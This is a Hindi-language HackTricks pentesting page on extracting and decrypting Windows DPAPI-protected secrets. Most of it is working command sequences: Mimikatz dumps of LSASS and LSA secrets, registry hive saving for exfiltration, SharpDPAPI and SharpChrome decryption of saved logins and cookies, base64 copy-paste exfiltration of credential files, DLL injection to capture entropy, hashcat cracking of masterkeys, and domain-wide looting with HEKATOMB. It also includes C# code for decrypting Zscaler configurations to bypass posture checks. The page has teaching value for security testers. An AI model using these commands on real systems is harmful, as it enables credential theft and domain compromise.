# DPAPI - Passwords निकालना

{{#include ../../banners/hacktricks-training.md}}



## DPAPI क्या है

Data Protection API (DPAPI) का उपयोग मुख्य रूप से Windows operating system में **asymmetric private keys के symmetric encryption** के लिए किया जाता है। इसमें entropy के एक महत्वपूर्ण स्रोत के रूप में user या system secrets का उपयोग होता है। यह तरीका developers के लिए encryption को सरल बनाता है: वे user के logon secrets से derived key का उपयोग करके data encrypt कर सकते हैं या system encryption के लिए system के domain authentication secrets का उपयोग कर सकते हैं। इससे developers को encryption key की सुरक्षा स्वयं संभालने की ज़रूरत नहीं पड़ती।

DPAPI का उपयोग करने का सबसे आम तरीका **`CryptProtectData` और `CryptUnprotectData`** functions के ज़रिए है। ये applications को वर्तमान में लॉग-ऑन process के security context का उपयोग करके data encrypt और decrypt करने देते हैं। डिफ़ॉल्ट रूप से, data को केवल वही user या system context decrypt कर सकता है जिसने उसे encrypt किया था।<sup>[[2]](#references)[[3]](#references)</sup>

ये functions encryption और decryption के दौरान इस्तेमाल होने वाला एक optional **entropy parameter** भी स्वीकार करते हैं। Optional entropy से सुरक्षित data को decrypt करने के लिए उसी entropy value की ज़रूरत होती है।<sup>[[2]](#references)[[6]](#references)</sup>

### Users key generation

DPAPI, user के credentials से user-specific value (जिसे अक्सर **pre-key** कहा जाता है) derive करता है। Derivation का सटीक तरीका account और operating-system version पर निर्भर करता है। उदाहरण के लिए, Impacket UTF-16LE password के SHA-1 digest पर आधारित HMAC-SHA1 path, password के MD4/NT hash पर आधारित एक अन्य path, और Protected Users के लिए PBKDF2-SHA256-derived path आज़माता है। इसी वजह से offline tooling अक्सर plaintext password या उपलब्ध NT hash से ज़रूरी material derive कर सकता है।<sup>[[2]](#references)[[10]](#references)</sup>

यह विशेष रूप से दिलचस्प है, क्योंकि अगर कोई attacker user का password hash हासिल कर ले, तो वह:

- **उस user की key से DPAPI का उपयोग करके encrypt किए गए किसी भी data को decrypt** कर सकता है, और इसके लिए किसी API से संपर्क करने की ज़रूरत नहीं होती
- मान्य DPAPI key बनाने की कोशिश में offline **password crack** कर सकता है

हर protected blob के लिए नया master key बनाने के बजाय, DPAPI हर user के लिए एक या अधिक **master keys** बनाए रखता है। हर master key का एक **GUID** (Globally Unique Identifier) होता है, और encrypted blob में यह दर्ज होता है कि उसे कौन-सी master key सुरक्षित करती है।<sup>[[2]](#references)</sup>

Master keys **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory में store होती हैं, जहाँ `{SID}` user का Security Identifier है। Master-key file में user के **pre-key** से सुरक्षित material और domain users के मामले में, **domain backup key** से सुरक्षित recovery material होता है।<sup>[[2]](#references)</sup>

ध्यान दें कि **master key को encrypt करने के लिए इस्तेमाल की जाने वाली domain key domain controllers में होती है और कभी नहीं बदलती**। इसलिए, अगर किसी attacker को domain controller का access मिल जाए, तो वह domain backup key हासिल करके domain के सभी users की master keys decrypt कर सकता है।<sup>[[2]](#references)</sup>

Encrypted blobs के headers में उस **master key का GUID** होता है जिसका उपयोग उनके अंदर मौजूद data को encrypt करने के लिए किया गया था।

> [!TIP]
> DPAPI encrypted blobs की शुरुआत **`01 00 00 00`** से होती है

Master keys ढूँढें:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

यह किसी user की कई Master Keys इस तरह दिखेंगी:

![DPAPI क्या है - Users key generation: किसी user की कई Master Keys इस तरह दिखेंगी](<../../images/image (1121).png>)

### Machine/System key generation

यह वह key है जिसका उपयोग machine data encrypt करने के लिए करती है। यह **DPAPI_SYSTEM LSA secret** पर आधारित होती है, जो एक विशेष key है जिसे केवल SYSTEM user ही access कर सकता है। इस key का उपयोग ऐसे data को encrypt करने के लिए किया जाता है जिसे system को स्वयं access करने की आवश्यकता होती है, जैसे machine-level credentials या system-wide secrets।<sup>[[2]](#references)</sup>

ध्यान दें कि इन keys का **domain backup नहीं होता**, इसलिए इन्हें केवल locally access किया जा सकता है:

- **Mimikatz** `mimikatz lsadump::secrets` command का उपयोग करके LSA secrets dump कर इसे access कर सकता है।
- यह secret registry में stored होता है, इसलिए administrator इसे access करने के लिए **DACL permissions modify कर सकता है**। Registry path है: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Registry hives से offline extraction भी संभव है। उदाहरण के लिए, target पर administrator के रूप में hives save करके उन्हें exfiltrate करें:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

फिर अपने analysis box पर, hives से DPAPI_SYSTEM LSA secret रिकवर करें और इसका इस्तेमाल machine-scope DPAPI blobs को decrypt करने के लिए करें (उदाहरण के लिए, machine-protected application credentials या Wi-Fi profiles):

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Veeam-विशिष्ट DPAPI उदाहरण:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### DPAPI द्वारा सुरक्षित डेटा

DPAPI द्वारा सुरक्षित व्यक्तिगत डेटा में शामिल हैं:

- Windows creds
- Internet Explorer और Google Chrome के passwords और auto-completion data
- Outlook और Windows Mail जैसे applications के E-mail और internal FTP account passwords
- Shared folders, resources, wireless networks और Windows Vault के passwords, जिनमें encryption keys भी शामिल हैं
- Remote desktop connections, .NET Passport और विभिन्न encryption तथा authentication उद्देश्यों के लिए private keys के passwords
- Credential Manager द्वारा प्रबंधित network passwords और CryptProtectData का उपयोग करने वाले applications में व्यक्तिगत डेटा, जैसे Skype, MSN messenger और अन्य
- Registry के अंदर encrypted blobs
- ...

System द्वारा सुरक्षित डेटा में शामिल हैं:
- Wi-Fi passwords
- ...

Scheduled-task passwords, LSA-secret से जुड़ा एक अलग विषय हैं। [Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) के साथ registered task, local administrator/SYSTEM recovery के लिए password store कर सकता है; S4U या interactive-token task से यह साबित नहीं होता कि password save किया गया था। किसी task का principal और logon type, केवल उसके run-as name से अधिक भरोसेमंद संकेत हैं।

### Master key निकालने के विकल्प

- यदि user के पास domain admin privileges हैं, तो वह domain के सभी user master keys को decrypt करने के लिए **domain backup key** तक पहुँच सकता है:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- स्थानीय admin privileges के साथ, सभी connected users की DPAPI master keys और SYSTEM key निकालने के लिए **LSASS memory तक access करना** संभव है।

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- यदि user के पास local admin privileges हैं, तो वे machine master keys को decrypt करने के लिए **DPAPI_SYSTEM LSA secret** तक access कर सकते हैं:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- अगर user का password या NTLM hash ज्ञात है, तो आप **सीधे user की master keys decrypt कर सकते हैं**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- अगर आप user के रूप में session में हैं, तो **RPC का उपयोग करके master keys decrypt करने के लिए DC से backup key माँगना** संभव है। अगर आप local admin हैं और user logged in है, तो आप उसका **session token चुरा सकते हैं**:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Vault की सूची

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## DPAPI एन्क्रिप्टेड डेटा तक पहुंच

### DPAPI एन्क्रिप्टेड डेटा ढूंढें

सामान्य उपयोगकर्ताओं की **सुरक्षित फाइलें** यहां होती हैं:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- ऊपर दिए गए paths में `\Roaming\` को `\Local\` से बदलकर भी देखें।

Enumeration के उदाहरण:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) फ़ाइल सिस्टम, रजिस्ट्री और B64 blobs में DPAPI-encrypted blobs ढूँढ़ सकता है:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

ध्यान दें कि [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (उसी repo से) का इस्तेमाल cookies जैसे संवेदनशील data को DPAPI का उपयोग करके decrypt करने के लिए किया जा सकता है।<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron त्वरित recipes (SharpChrome)

- मौजूदा user के लिए, saved logins/cookies का interactive decryption (Chrome 127+ app-bound cookies के साथ भी काम करता है, क्योंकि user context में चलने पर अतिरिक्त key user के Credential Manager से resolve की जाती है):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- जब आपके पास केवल files हों, तब offline analysis करें। पहले profile के "Local State" से AES state key निकालें, फिर इसका उपयोग cookie DB को decrypt करने के लिए करें:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- जब आपके पास DPAPI domain backup key (PVK) और target host पर admin access हो, तब domain-wide/remote triage:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- अगर आपके पास किसी user की DPAPI prekey/credkey (LSASS से) है, तो आप password cracking को छोड़कर सीधे profile data decrypt कर सकते हैं:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

नोट्स
- Chrome/Edge के नए builds कुछ cookies को "App-Bound" encryption का उपयोग करके store कर सकते हैं। अतिरिक्त app-bound key के बिना उन विशिष्ट cookies को offline decrypt करना संभव नहीं है; इसे अपने-आप retrieve करने के लिए SharpChrome को target user context में चलाएँ। नीचे दिए गए Chrome security blog post को देखें।<sup>[[5]](#references)</sup>

### Access keys और data

- **SharpDPAPI का उपयोग करें** ताकि current session से DPAPI-encrypted files में मौजूद credentials प्राप्त किए जा सकें:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **credentials की जानकारी प्राप्त करें** जैसे encrypted data और guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **masterkeys तक पहुंच**:

RPC का उपयोग करके **domain backup key** का अनुरोध करने वाले user की masterkey decrypt करें:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

**SharpDPAPI** tool masterkey decryption के लिए इन arguments को भी support करता है (ध्यान दें कि domains backup key पाने के लिए `/rpc`, plaintext password इस्तेमाल करने के लिए `/password`, या DPAPI domain private key file निर्दिष्ट करने के लिए `/pvk` का उपयोग किया जा सकता है...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **masterkey का उपयोग करके data decrypt करें**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

**SharpDPAPI** tool `credentials|vaults|rdg|keepass|triage|blob|ps` decryption के लिए इन arguments को भी support करता है (ध्यान दें कि domains backup key पाने के लिए `/rpc`, plaintext password इस्तेमाल करने के लिए `/password`, DPAPI domain private key file निर्दिष्ट करने के लिए `/pvk`, और current user's session इस्तेमाल करने के लिए `/unprotect` का उपयोग किया जा सकता है...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- DPAPI prekey/credkey का सीधे उपयोग करके (पासवर्ड की ज़रूरत नहीं)

अगर आप LSASS dump कर सकते हैं, तो Mimikatz अक्सर प्रति-logon DPAPI key दिखाता है, जिसका उपयोग plaintext password जाने बिना user के masterkeys decrypt करने के लिए किया जा सकता है। यह value सीधे tooling को दें:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- **वर्तमान उपयोगकर्ता सत्र** का उपयोग करके कुछ डेटा Decrypt करें:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Impacket dpapi.py के साथ Offline decryption

अगर आपके पास victim user का SID और password (या NT hash) है, तो आप Impacket के dpapi.py का उपयोग करके DPAPI masterkeys और Credential Manager blobs को पूरी तरह offline decrypt कर सकते हैं।<sup>[[10]](#references)[[11]](#references)</sup>

- Disk पर artefacts की पहचान करें:
  - Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
  - Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- अगर file transfer tooling अस्थिर हो, तो host पर files को base64 में encode करके output copy करें:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- उपयोगकर्ता के SID और password/hash से masterkey को Decrypt करें:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- credential blob को decrypt करने के लिए decrypted masterkey का उपयोग करें:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

यह workflow अक्सर Windows Credential Manager का इस्तेमाल करने वाले apps द्वारा सेव किए गए domain credentials को रिकवर करता है, जिनमें administrative accounts (जैसे, `*_adm`) भी शामिल हैं।

---

### Optional Entropy ("Third-party entropy" को संभालना)

कुछ applications `CryptProtectData` को एक अतिरिक्त **entropy** value देते हैं। इस value के बिना blob को decrypt नहीं किया जा सकता, भले ही सही masterkey पता हो। इसलिए, इस तरह से protected credentials को target करते समय entropy प्राप्त करना आवश्यक है (जैसे, Microsoft Outlook और कुछ VPN clients)।

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) एक user-mode DLL है, जो target process के अंदर DPAPI functions को hook करता है और दिए गए किसी भी optional entropy को पारदर्शी रूप से record करता है। `outlook.exe` या `vpnclient.exe` जैसी processes के विरुद्ध **DLL-injection** mode में EntropyCapture चलाने पर एक file बनती है, जो हर entropy buffer को calling process और blob से map करती है। Captured entropy को बाद में data decrypt करने के लिए **SharpDPAPI** (`/entropy:`) या **Mimikatz** (`/entropy:<file>`) को दिया जा सकता है।<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ने Windows 10 v1607 (2016) से **context 3** masterkey format पेश किया। `hashcat` v6.2.6 (दिसंबर 2023) में hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) और **22102** (context 3) जोड़े गए, जिनकी मदद से masterkey file से सीधे user passwords को GPU-accelerated तरीके से crack किया जा सकता है। इसलिए attackers target system से interact किए बिना word-list या brute-force attacks कर सकते हैं।<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) इस प्रक्रिया को automate करता है:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

यह tool Credential और Vault blobs को भी parse कर सकता है, उन्हें cracked keys से decrypt कर सकता है और cleartext passwords export कर सकता है।<sup>[[8]](#references)</sup>


### दूसरी मशीन का डेटा एक्सेस करना

**SharpDPAPI और SharpChrome** में आप किसी remote मशीन का डेटा एक्सेस करने के लिए **`/server:HOST`** option दे सकते हैं। बेशक, आपको उस मशीन को access करने में सक्षम होना होगा और नीचे दिए गए example में माना गया है कि **domain backup encryption key ज्ञात है**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

## अन्य tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) एक ऐसा tool है जो LDAP directory से सभी users और computers को extract करने और RPC के ज़रिए domain controller backup key को extract करने की प्रक्रिया automate करता है। इसके बाद script सभी computers के IP address resolve करेगी और सभी computers पर smbclient चलाकर सभी users के DPAPI blobs प्राप्त करेगी और domain backup key से सब कुछ decrypt करेगी।

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP से निकाली गई computers की list से आप हर sub network ढूँढ सकते हैं, भले ही आपको उनके बारे में पहले से पता न हो!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) DPAPI द्वारा सुरक्षित secrets को अपने-आप dump कर सकता है। 2.x release में ये सुविधाएँ जोड़ी गईं:<sup>[[9]](#references)</sup>

* सैकड़ों hosts से blobs का parallel collection
* **context 3** masterkeys की parsing और Hashcat cracking का automatic integration
* Chrome के "App-Bound" encrypted cookies के लिए support (अगला section देखें)
* नए **`--snapshot`** mode से endpoints को बार-बार poll करके नए बनाए गए blobs का diff देखा जा सकता है

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) masterkey/credential/vault files के लिए एक C# parser है, जो Hashcat/JtR formats में output दे सकता है और वैकल्पिक रूप से cracking अपने-आप चला सकता है। यह Windows 11 24H1 तक के machine और user masterkey formats को पूरी तरह support करता है।<sup>[[8]](#references)</sup>


## आम detections

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` और अन्य DPAPI-संबंधित directories में files तक पहुँच।
    - खासकर **C$** या **ADMIN$** जैसे network share से।
- LSASS memory तक पहुँचने या masterkeys dump करने के लिए **Mimikatz**, **SharpDPAPI** या इसी तरह के tooling का इस्तेमाल।
- Event **4662**: *किसी object पर operation किया गया* – इसे **`BCKUPKEY`** object तक पहुँच के साथ correlate किया जा सकता है।
- जब कोई process *SeTrustedCredManAccessPrivilege* (Credential Manager) का अनुरोध करता है, तब Event **4673/4674**।

---
### 2023-2025 की vulnerabilities और ecosystem में बदलाव

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (नवंबर 2023)। Network access वाला attacker किसी domain member को malicious DPAPI backup key प्राप्त करने के लिए धोखा दे सकता था, जिससे user masterkeys decrypt किए जा सकते थे। नवंबर 2023 के cumulative update में इसका patch जारी किया गया – administrators को सुनिश्चित करना चाहिए कि DCs और workstations पूरी तरह patched हों।<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (जुलाई 2024) ने पुरानी केवल-DPAPI सुरक्षा की जगह user के **Credential Manager** में store की गई एक अतिरिक्त key का इस्तेमाल शुरू किया। अब cookies को offline decrypt करने के लिए DPAPI masterkey और **GCM-wrapped app-bound key**, दोनों की आवश्यकता होती है। User context में चलने पर SharpChrome v2.3 और DonPAPI 2.x अतिरिक्त key recover कर सकते हैं।<sup>[[5]](#references)</sup>


### केस स्टडी: Zscaler Client Connector – SID से प्राप्त Custom Entropy

Zscaler Client Connector कई configuration files `C:\ProgramData\Zscaler` में store करता है (जैसे `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`)। हर file **DPAPI (Machine scope)** से encrypted होती है, लेकिन vendor **custom entropy** देता है, जिसे disk पर store करने के बजाय *runtime पर calculate* किया जाता है।<sup>[[1]](#references)</sup>

Entropy को दो elements से फिर से बनाया जाता है:

1. `ZSACredentialProvider.dll` के अंदर embedded एक hard-coded secret।
2. उस Windows account का **SID** जिससे configuration संबंधित है।

DLL में लागू algorithm इसके बराबर है:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

क्योंकि secret एक DLL में एम्बेडेड है जिसे disk से पढ़ा जा सकता है, **SYSTEM अधिकारों वाला कोई भी local attacker किसी भी SID के लिए entropy फिर से जनरेट कर सकता है** और blobs को offline decrypt कर सकता है:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

Decryption से पूरा JSON configuration मिलता है, जिसमें हर **device posture check** और उसका अपेक्षित मान शामिल होता है—client-side bypasses करने की कोशिश में यह जानकारी बहुत उपयोगी होती है।

> TIP: अन्य encrypted artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI से **बिना** entropy (`16` zero bytes) के सुरक्षित हैं। इसलिए SYSTEM privileges मिलने के बाद इन्हें सीधे `ProtectedData.Unprotect` से decrypt किया जा सकता है।

## References

- [1] [Synacktiv – क्या आपको अपने zero trust पर भरोसा करना चाहिए? Zscaler posture checks को bypass करना](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. DPAPI में security analysis और data recovery](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz और C++ से DPAPI Encrypted Secrets पढ़ना](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows पर Chrome cookies की security बेहतर करना](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI Optional Entropy का सरल Extraction](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, और DPAPI decryption से DC admin तक](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – उपयोग और विकल्प](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
